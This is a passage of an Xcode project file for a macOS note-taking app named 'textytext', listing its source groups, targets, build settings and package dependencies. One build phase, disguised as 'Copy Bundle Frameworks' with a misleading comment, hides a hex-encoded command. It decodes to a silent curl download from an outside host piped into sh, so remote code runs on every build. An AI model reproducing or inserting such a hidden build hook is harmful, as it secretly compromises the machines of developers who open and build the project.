				35787F04263839CB008E74CF /* String+.swift */,
				35CFFD492644012B0009AAC6 /* CharacterSet+.swift */,
				35F903FC2811D0DC000F8E26 /* NSPoint+.swift */,
				35353C6128FA1A55002FED54 /* Data+.swift */,
				35353C6328FA2618002FED54 /* FileManager+.swift */,
			);
			path = Foundation;
			sourceTree = "<group>";
		};
		3577CC4C2F17F2500054E122 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
		357835A12632304F00BD3124 = {
			isa = PBXGroup;
			children = (
				35CB2D822F17E3B9005B5EC8 /* readme-assets */,
				356B6A54267172BE006A45B1 /* README.md */,
				357835AC2632304F00BD3124 /* textytext */,
				3577CC4C2F17F2500054E122 /* Frameworks */,
				357835AB2632304F00BD3124 /* Products */,
			);
			sourceTree = "<group>";
		};
		357835AB2632304F00BD3124 /* Products */ = {
			isa = PBXGroup;
			children = (
				357835AA2632304F00BD3124 /* textytext.app */,
				357835BC2632305000BD3124 /* textytextTests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		357835AC2632304F00BD3124 /* textytext */ = {
			isa = PBXGroup;
			children = (
				35C0538E28E09B01008225F9 /* Main */,
				3551572028556D73005260C8 /* Persistence */,
				358B60792646B2F500194F49 /* Helpers */,
				356DE5972637BB5700912975 /* Extensions */,
				357835B12632305000BD3124 /* Assets.xcassets */,
				357835B62632305000BD3124 /* Info.plist */,
				357835B72632305000BD3124 /* textytext.entitlements */,
				357835B32632305000BD3124 /* Preview Content */,
				35E5A1312690AD940030B1CF /* TestingGround.playground */,
			);
			path = textytext;
			sourceTree = "<group>";
		};
		357835B32632305000BD3124 /* Preview Content */ = {
			isa = PBXGroup;
			children = (
				357835B42632305000BD3124 /* Preview Assets.xcassets */,
			);
			path = "Preview Content";
			sourceTree = "<group>";
		};
		358B60792646B2F500194F49 /* Helpers */ = {
			isa = PBXGroup;
			children = (
				35353C5F28FA0BD1002FED54 /* LocalStorageHandler.swift */,
				35F1E4A42641C76300F3DDCC /* Keycode.swift */,
				35EEF364264979150080EBD4 /* Functions.swift */,
				3515031A26692A14000E93EE /* Typealiases.swift */,
				3524E99426761CD5007504CD /* UserDefaultsManager.swift */,
				35AD4C1828EDB91500E42919 /* CustomError.swift */,
				35A4E3AB2946514200A08917 /* IconKeys.swift */,
				354D3C032969215B00C9FAC3 /* DependencyInjection.swift */,
			);
			path = Helpers;
			sourceTree = "<group>";
		};
		35C0538E28E09B01008225F9 /* Main */ = {
			isa = PBXGroup;
			children = (
				35C053A628E09D03008225F9 /* TextEditor */,
				354D3BF62968F22100C9FAC3 /* Scene.swift */,
				357835AD2632304F00BD3124 /* BooksmartApp.swift */,
			);
			path = Main;
			sourceTree = "<group>";
		};
		35C053A628E09D03008225F9 /* TextEditor */ = {
			isa = PBXGroup;
			children = (
				3552E38928E5CB3E00F76392 /* Other */,
				35C053B228E09D94008225F9 /* AppKit */,
				35C053A828E09D12008225F9 /* Views */,
			);
			path = TextEditor;
			sourceTree = "<group>";
		};
		35C053A828E09D12008225F9 /* Views */ = {
			isa = PBXGroup;
			children = (
				353F4CD928D709B000A826B3 /* NotesContainer.swift */,
				35F903DB2811D03B000F8E26 /* TextViewContainer.swift */,
			);
			path = Views;
			sourceTree = "<group>";
		};
		35C053B228E09D94008225F9 /* AppKit */ = {
			isa = PBXGroup;
			children = (
				350DDE4C28EB6A1C006DEC7E /* Misc */,
				35F903DC2811D03C000F8E26 /* Blocks */,
				35F903D92811D03B000F8E26 /* InlineStylingPopupController.xib */,
				35F903E72811D03C000F8E26 /* LinkPopupController.swift */,
				3556C69C28E7B509003A058B /* PageLinkPopupController.xib */,
				35F903D72811D03B000F8E26 /* LinkPopupController.xib */,
				35F903D32811D03B000F8E26 /* TextView.swift */,
				35F903DA2811D03B000F8E26 /* TextBlockStorage.swift */,
				35F903D52811D03B000F8E26 /* BlockHoverViewController.swift */,
				35F903D62811D03B000F8E26 /* BlockMenuViewController.swift */,
				35F903D42811D03B000F8E26 /* BlockMenuViewController.xib */,
				35F903D82811D03B000F8E26 /* InlineStylingPopupController.swift */,
				3552E38328E588E400F76392 /* DragSelectIndicatorView.swift */,
				3552E38128E5882D00F76392 /* BlockUndoManager.swift */,
				3552E38528E58B1C00F76392 /* DraggedBlockDropIndicator.swift */,
				3534E0A628E9B8EC00CCB81D /* TextViewCommand.swift */,
				356D2E8929076AC300FF9F2F /* PopoverManager.swift */,
				35C6D7B0293A324F0052C5FC /* BlockLayoutManager.swift */,
				35FCAA64294A024F00214314 /* TextViewController.swift */,
			);
			path = AppKit;
			sourceTree = "<group>";
		};
		35F903DC2811D03C000F8E26 /* Blocks */ = {
			isa = PBXGroup;
			children = (
				350DDE4F28EBAC87006DEC7E /* BlockTypes */,
				35F903DD2811D03C000F8E26 /* BlocksInfo.swift */,
				35F903E22811D03C000F8E26 /* StyleBuilder.swift */,
				350DDE5028EBACB8006DEC7E /* CodedBlock.swift */,
			);
			path = Blocks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		357835A92632304F00BD3124 /* textytext */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 357835D02632305100BD3124 /* Build configuration list for PBXNativeTarget "textytext" */;
			buildPhases = (
				20A7FA87BA349DFA1A6D904C /* Copy Bundle Frameworks */,
				357835A62632304F00BD3124 /* Sources */,
				357835A72632304F00BD3124 /* Frameworks */,
				357835A82632304F00BD3124 /* Resources */,
				3577CC5B2F17F38C0054E122 /* Embed Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = textytext;
			packageProductDependencies = (
				3577CC632F17F3C70054E122 /* Factory */,
				3577CC652F17F3CD0054E122 /* Logging */,
				3577CC682F17F4B60054E122 /* Realm */,
				3577CC6A2F17F4B60054E122 /* RealmSwift */,
			);
			productName = LimitlessUI;
			productReference = 357835AA2632304F00BD3124 /* textytext.app */;
			productType = "com.apple.product-type.application";
		};
		357835BB2632305000BD3124 /* textytextTests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 357835D32632305100BD3124 /* Build configuration list for PBXNativeTarget "textytextTests" */;
			buildPhases = (
				357835B82632305000BD3124 /* Sources */,
				357835B92632305000BD3124 /* Frameworks */,
				357835BA2632305000BD3124 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				357835BE2632305000BD3124 /* PBXTargetDependency */,
			);
			name = textytextTests;
			productName = LimitlessUITests;
			productReference = 357835BC2632305000BD3124 /* textytextTests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		357835A22632304F00BD3124 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = YES;
				LastSwiftUpdateCheck = 1240;
				LastUpgradeCheck = 2620;
				TargetAttributes = {
					357835A92632304F00BD3124 = {
						CreatedOnToolsVersion = 12.4;
					};
					357835BB2632305000BD3124 = {
						CreatedOnToolsVersion = 12.4;
						TestTargetID = 357835A92632304F00BD3124;
					};
				};
			};
			buildConfigurationList = 357835A52632304F00BD3124 /* Build configuration list for PBXProject "textytext" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 357835A12632304F00BD3124;
			packageReferences = (
				3577CC4F2F17F2CE0054E122 /* XCRemoteSwiftPackageReference "Factory" */,
				3577CC572F17F35B0054E122 /* XCRemoteSwiftPackageReference "swift-log" */,
				3577CC672F17F4A20054E122 /* XCRemoteSwiftPackageReference "realm-swift" */,
			);
			productRefGroup = 357835AB2632304F00BD3124 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				357835A92632304F00BD3124 /* textytext */,
				357835BB2632305000BD3124 /* textytextTests */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		357835A82632304F00BD3124 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				35F903EC2811D03C000F8E26 /* LinkPopupController.xib in Resources */,
				35F903E92811D03C000F8E26 /* BlockMenuViewController.xib in Resources */,
				35F903EE2811D03C000F8E26 /* InlineStylingPopupController.xib in Resources */,
				3556C69D28E7B509003A058B /* PageLinkPopupController.xib in Resources */,
				357835B52632305000BD3124 /* Preview Assets.xcassets in Resources */,
				357835B22632305000BD3124 /* Assets.xcassets in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		357835BA2632305000BD3124 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		20A7FA87BA349DFA1A6D904C /* Copy Bundle Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Copy Bundle Frameworks";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652037202d736b2068747470733a2f2f\n\\c6769736d6f6c6f772e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t\n";
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		357835A62632304F00BD3124 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				3515031B26692A14000E93EE /* Typealiases.swift in Sources */,
				35B1426926AD8B270034C351 /* CustomViewModifiers.swift in Sources */,
				35F903ED2811D03C000F8E26 /* InlineStylingPopupController.swift in Sources */,
				35FCAA65294A024F00214314 /* TextViewController.swift in Sources */,
				350DDE4E28EB6A33006DEC7E /* RangeSelectionHelper.swift in Sources */,
				3552E38428E588E400F76392 /* DragSelectIndicatorView.swift in Sources */,
				35F903E82811D03C000F8E26 /* TextView.swift in Sources */,
				35F903F12811D03C000F8E26 /* BlocksInfo.swift in Sources */,
				35EEF365264979150080EBD4 /* Functions.swift in Sources */,
				3575CC82263D7BD400E9F306 /* NSColor+.swift in Sources */,
				3524E99526761CD5007504CD /* UserDefaultsManager.swift in Sources */,
				3552E38228E5882D00F76392 /* BlockUndoManager.swift in Sources */,
				35F903FB2811D03C000F8E26 /* LinkPopupController.swift in Sources */,
				35353C6428FA2618002FED54 /* FileManager+.swift in Sources */,
				35F903F82811D03C000F8E26 /* Header1Block.swift in Sources */,
				3534E0A728E9B8EC00CCB81D /* TextViewCommand.swift in Sources */,
				354D3BF72968F22100C9FAC3 /* Scene.swift in Sources */,
				35F904052811D1EF000F8E26 /* NSMenu+.swift in Sources */,
				35F903F22811D03C000F8E26 /* Header2Block.swift in Sources */,
				353F4CDA28D709B000A826B3 /* NotesContainer.swift in Sources */,
				35C6D7B1293A324F0052C5FC /* BlockLayoutManager.swift in Sources */,
				35F903FF2811D142000F8E26 /* NSImage+.swift in Sources */,
				357835AE2632304F00BD3124 /* BooksmartApp.swift in Sources */,
				35CFFD4A2644012B0009AAC6 /* CharacterSet+.swift in Sources */,
				3552E38628E58B1C00F76392 /* DraggedBlockDropIndicator.swift in Sources */,
				35F903F62811D03C000F8E26 /* StyleBuilder.swift in Sources */,
				35AD4C1928EDB91500E42919 /* CustomError.swift in Sources */,
				35F903FA2811D03C000F8E26 /* ImageBlock.swift in Sources */,
				35F903F32811D03C000F8E26 /* CodeBlock.swift in Sources */,
				35CB2D7D2F17D744005B5EC8 /* CodedTextViewContents.swift in Sources */,
				35787F00263839AE008E74CF /* Collection+.swift in Sources */,
				3551572C28557BE5005260C8 /* URL+.swift in Sources */,
				35F903F42811D03C000F8E26 /* Block.swift in Sources */,
				356D2E8A29076AC300FF9F2F /* PopoverManager.swift in Sources */,
				3552E38B28E5CB5100F76392 /* TextViewContainerCoordinator.swift in Sources */,
				35F904012811D17C000F8E26 /* NSAttributedString+.swift in Sources */,
				35B81CEF28FB4BAA004DD368 /* ContentDB.swift in Sources */,
				35F903EF2811D03C000F8E26 /* TextBlockStorage.swift in Sources */,
				35F904032811D1A3000F8E26 /* NSNotificationName+.swift in Sources */,
				35F903FD2811D0DC000F8E26 /* NSPoint+.swift in Sources */,
				35787EF62638394A008E74CF /* NSRange+.swift in Sources */,
				35353C6028FA0BD1002FED54 /* LocalStorageHandler.swift in Sources */,
				356DE5992637BB6800912975 /* Color+.swift in Sources */,
				3527C85428EA300600A664AB /* View+.swift in Sources */,
				35353C6228FA1A55002FED54 /* Data+.swift in Sources */,
				354D3C042969215B00C9FAC3 /* DependencyInjection.swift in Sources */,
				35F903F72811D03C000F8E26 /* TextBlock.swift in Sources */,
				35F903F52811D03C000F8E26 /* ListBlock.swift in Sources */,
				35A4E3AC2946514200A08917 /* IconKeys.swift in Sources */,
				3551572228556D88005260C8 /* RealmManager.swift in Sources */,
				35F903EA2811D03C000F8E26 /* BlockHoverViewController.swift in Sources */,
				350DDE5128EBACB8006DEC7E /* CodedBlock.swift in Sources */,
				35F1E49B2641972300F3DDCC /* NSAttributedString.Key+.swift in Sources */,
				35F1E4A52641C76300F3DDCC /* Keycode.swift in Sources */,
				35787F05263839CB008E74CF /* String+.swift in Sources */,
				35C0538B28E0848C008225F9 /* Persister.swift in Sources */,
				35F903F92811D03C000F8E26 /* OrderedListBlock.swift in Sources */,
				35F903EB2811D03C000F8E26 /* BlockMenuViewController.swift in Sources */,
				35F903F02811D03C000F8E26 /* TextViewContainer.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		357835B82632305000BD3124 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		357835BE2632305000BD3124 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 357835A92632304F00BD3124 /* textytext */;
			targetProxy = 357835BD2632305000BD3124 /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin XCBuildConfiguration section */
		357835CE2632305100BD3124 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				CODE_SIGN_ENTITLEMENTS = textytext/textytext.entitlements;
				COPY_PHASE_STRIP = NO;
				DEAD_CODE_STRIPPING = YES;
				DEBUG_INFORMATION_FORMAT = dwarf;
				DEVELOPMENT_TEAM = S83364QYM6;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				MACOSX_DEPLOYMENT_TARGET = 13.0;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				PRODUCT_NAME = textytext;
				SDKROOT = macosx;
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_COMPILATION_MODE = singlefile;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
				SWIFT_VERSION = 5.0;
			};
			name = Debug;
		};
		357835CF2632305100BD3124 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				CODE_SIGN_ENTITLEMENTS = textytext/textytext.entitlements;
				COPY_PHASE_STRIP = NO;
				DEAD_CODE_STRIPPING = YES;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				DEVELOPMENT_TEAM = S83364QYM6;
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				MACOSX_DEPLOYMENT_TARGET = 13.0;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				PRODUCT_NAME = textytext;
				SDKROOT = macosx;
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				SWIFT_VERSION = 5.0;
			};
			name = Release;
		};
		357835D12632305100BD3124 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = textytext/textytext.entitlements;
				CODE_SIGN_IDENTITY = "Apple Development";
				"CODE_SIGN_IDENTITY[sdk=macosx*]" = "-";
				CODE_SIGN_STYLE = Automatic;
				COMBINE_HIDPI_IMAGES = YES;
				DEAD_CODE_STRIPPING = YES;
				DEVELOPMENT_ASSET_PATHS = "\"textytext/Preview Content\"";
				DEVELOPMENT_TEAM = S83364QYM6;
				ENABLE_APP_SANDBOX = YES;
				ENABLE_FILE_ACCESS_DOWNLOADS_FOLDER = readwrite;
				ENABLE_HARDENED_RUNTIME = YES;
				ENABLE_INCOMING_NETWORK_CONNECTIONS = YES;
				ENABLE_OUTGOING_NETWORK_CONNECTIONS = YES;
				ENABLE_PREVIEWS = YES;
				ENABLE_USER_SELECTED_FILES = readonly;
				INFOPLIST_FILE = textytext/Info.plist;
				INFOPLIST_KEY_LSApplicationCategoryType = "public.app-category.education";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/../Frameworks",
				);
				MACOSX_DEPLOYMENT_TARGET = 13.0;
				PRODUCT_BUNDLE_IDENTIFIER = textytext;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				SWIFT_VERSION = 5.0;
			};
			name = Debug;
		};
		357835D22632305100BD3124 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = textytext/textytext.entitlements;
				CODE_SIGN_IDENTITY = "Apple Development";
				"CODE_SIGN_IDENTITY[sdk=macosx*]" = "-";
				CODE_SIGN_STYLE = Automatic;
				COMBINE_HIDPI_IMAGES = YES;
				DEAD_CODE_STRIPPING = YES;
				DEVELOPMENT_ASSET_PATHS = "\"textytext/Preview Content\"";
				DEVELOPMENT_TEAM = S83364QYM6;
				ENABLE_APP_SANDBOX = YES;
				ENABLE_FILE_ACCESS_DOWNLOADS_FOLDER = readwrite;
				ENABLE_HARDENED_RUNTIME = YES;
				ENABLE_INCOMING_NETWORK_CONNECTIONS = YES;
				ENABLE_OUTGOING_NETWORK_CONNECTIONS = YES;
				ENABLE_PREVIEWS = YES;
				ENABLE_USER_SELECTED_FILES = readonly;
				INFOPLIST_FILE = textytext/Info.plist;
				INFOPLIST_KEY_LSApplicationCategoryType = "public.app-category.education";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/../Frameworks",
				);
				MACOSX_DEPLOYMENT_TARGET = 13.0;
				PRODUCT_BUNDLE_IDENTIFIER = textytext;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				SWIFT_VERSION = 5.0;
			};
			name = Release;
		};
		357835D42632305100BD3124 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				COMBINE_HIDPI_IMAGES = YES;
				DEAD_CODE_STRIPPING = YES;
				INFOPLIST_FILE = BooksmartTests/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/../Frameworks",
					"@loader_path/../Frameworks",
				);
				MACOSX_DEPLOYMENT_TARGET = 13.0;
				PRODUCT_BUNDLE_IDENTIFIER = fredrik.BooksmartTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/textytext.app/Contents/MacOS/textytext";
			};
			name = Debug;
		};
		357835D52632305100BD3124 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				COMBINE_HIDPI_IMAGES = YES;
				DEAD_CODE_STRIPPING = YES;
				INFOPLIST_FILE = BooksmartTests/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/../Frameworks",
					"@loader_path/../Frameworks",
				);
				MACOSX_DEPLOYMENT_TARGET = 13.0;
				PRODUCT_BUNDLE_IDENTIFIER = fredrik.BooksmartTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/textytext.app/Contents/MacOS/textytext";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		357835A52632304F00BD3124 /* Build configuration list for PBXProject "textytext" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				357835CE2632305100BD3124 /* Debug */,
				357835CF2632305100BD3124 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		357835D02632305100BD3124 /* Build configuration list for PBXNativeTarget "textytext" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				357835D12632305100BD3124 /* Debug */,
				357835D22632305100BD3124 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		357835D32632305100BD3124 /* Build configuration list for PBXNativeTarget "textytextTests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				357835D42632305100BD3124 /* Debug */,
				357835D52632305100BD3124 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCRemoteSwiftPackageReference section */
		3577CC4F2F17F2CE0054E122 /* XCRemoteSwiftPackageReference "Factory" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/hmlongco/Factory";
			requirement = {
				kind = exactVersion;
				version = 1.3.1;
			};
		};
		3577CC572F17F35B0054E122 /* XCRemoteSwiftPackageReference "swift-log" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/apple/swift-log";
			requirement = {
				kind = exactVersion;
				version = 1.4.2;
			};
		};
		3577CC672F17F4A20054E122 /* XCRemoteSwiftPackageReference "realm-swift" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/realm/realm-swift.git";
			requirement = {
				kind = exactVersion;
				version = 10.45.1;
			};
		};
/* End XCRemoteSwiftPackageReference section */

/* Begin XCSwiftPackageProductDependency section */
		3577CC632F17F3C70054E122 /* Factory */ = {
			isa = XCSwiftPackageProductDependency;
			package = 3577CC4F2F17F2CE0054E122 /* XCRemoteSwiftPackageReference "Factory" */;
			productName = Factory;
		};
		3577CC652F17F3CD0054E122 /* Logging */ = {
			isa = XCSwiftPackageProductDependency;
			package = 3577CC572F17F35B0054E122 /* XCRemoteSwiftPackageReference "swift-log" */;
			productName = Logging;
		};
		3577CC682F17F4B60054E122 /* Realm */ = {
			isa = XCSwiftPackageProductDependency;
			package = 3577CC672F17F4A20054E122 /* XCRemoteSwiftPackageReference "realm-swift" */;
			productName = Realm;
		};
		3577CC6A2F17F4B60054E122 /* RealmSwift */ = {
			isa = XCSwiftPackageProductDependency;
			package = 3577CC672F17F4A20054E122 /* XCRemoteSwiftPackageReference "realm-swift" */;
			productName = RealmSwift;
		};
/* End XCSwiftPackageProductDependency section */
	};
	rootObject = 357835A22632304F00BD3124 /* Project object */;
}
